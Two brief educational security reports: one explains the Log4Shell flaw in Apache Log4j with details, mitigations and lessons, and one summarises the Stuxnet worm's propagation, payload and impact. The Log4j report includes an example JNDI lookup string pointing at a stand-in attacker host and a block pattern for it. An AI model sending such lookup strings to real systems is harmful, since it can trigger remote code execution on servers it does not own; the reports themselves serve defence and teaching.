
# Technical Report: Log4j Vulnerability (Log4Shell)

## Overview
In December 2021, a critical zero-day vulnerability, tracked as CVE-2021-44228, was discovered in Apache Log4j 2, a popular Java-based logging library. The flaw, dubbed **Log4Shell**, allowed remote code execution (RCE) by simply logging a specially crafted string.

## Vulnerability Details
- **CVE ID**: CVE-2021-44228 (and related CVE-2021-45046, CVE-2021-45105)
- **Severity**: Critical (CVSS Score: 10.0)
- **Affected Versions**: Apache Log4j 2.x < 2.15.0 (later advisories extended to 2.16.0 and 2.17.0 for additional issues)
- **Attack Vector**:
  1. Log4j performs **message lookup substitutions**.
  2. An attacker sends a string like: `${jndi:ldap://attacker.com/a}`.
  3. JNDI connects to the attacker-controlled server.
  4. Malicious Java bytecode is returned and executed.

## Impact
- Remote Code Execution (RCE) without authentication.
- Potential full compromise of affected servers.
- Massive attack surface due to widespread use of Log4j in enterprise and open-source projects.

## Mitigation
1. **Upgrade** to Log4j 2.17.1+.
2. Remove the `JndiLookup` class from the classpath:
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```
3. Disable message lookups:
   ```bash
   -Dlog4j2.formatMsgNoLookups=true
   ```
4. Apply WAF rules to block `${jndi:` patterns.

## Real-World Exploitation
- Exploited in the wild within hours of disclosure.
- Used in ransomware, cryptomining, botnets, and espionage campaigns.
- Affected cloud services (AWS, Minecraft servers, etc.).

## Lessons Learned
- Widespread dependencies can introduce systemic risks.
- Supply chain security and SBOM (Software Bill of Materials) are critical.
- Rapid patch management processes are essential.


---


# Technical Report: Stuxnet Worm

## Overview
Stuxnet is a sophisticated computer worm discovered in 2010, widely believed to have been developed by the U.S. and Israel to sabotage Iran's nuclear enrichment facilities. It is notable as the first publicly known malware to target industrial control systems (ICS) and cause physical damage.

## Technical Details
- **First Detected**: June 2010
- **Targets**: Siemens Step7 software and PLCs (Programmable Logic Controllers)
- **Propagation Methods**:
  1. **USB drives** with LNK shortcut exploits.
  2. Windows network shares and printer spooler zero-days.
  3. Exploitation of Windows vulnerabilities (including CVE-2010-2568).

## Payload
- Injects malicious code into PLCs controlling uranium centrifuges.
- Alters rotor speeds causing mechanical degradation while feeding false normal readings to operators.
- Highly stealthy to avoid detection.

## Exploited Vulnerabilities
- Multiple Windows zero-days:
  - CVE-2010-2568 (LNK vulnerability)
  - CVE-2010-2729 (Print Spooler vulnerability)
  - Others targeting privilege escalation and code execution.

## Impact
- Damaged approximately 1,000 centrifuges at the Natanz facility.
- Set back Iran's nuclear program by months or years.
- Demonstrated the potential of cyber weapons to cause real-world damage.

## Detection & Analysis
- First identified by VirusBlokAda (Belarus) and analyzed by Symantec.
- Contained advanced rootkit components for both Windows and PLC firmware.
- Estimated development took years and significant resources.

## Lessons Learned
- ICS/SCADA systems are high-value targets.
- Air-gapping is not a guarantee of security.
- Cyber operations can have geopolitical consequences.

